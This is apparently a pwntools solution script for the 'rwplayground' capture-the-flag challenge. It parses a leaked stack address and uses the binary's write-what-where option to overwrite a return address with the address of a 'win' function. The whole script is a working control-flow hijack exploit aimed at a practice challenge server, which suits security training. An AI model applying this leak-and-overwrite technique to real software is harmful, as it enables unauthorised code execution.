from pwn import *

# p = process('./rwplayground')
p = remote('rwplayground.challs.territoriali.olicyber.it', 38001)

p.recvuntil(b'gift for you... ')
leak = p.recvline().strip()
input_addr = int(leak, 16)

ret_addr = input_addr + 0x18

win_addr = 0x401397

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'where: ', hex(ret_addr).encode())
p.sendlineafter(b'what: ', hex(win_addr).encode())

p.interactive()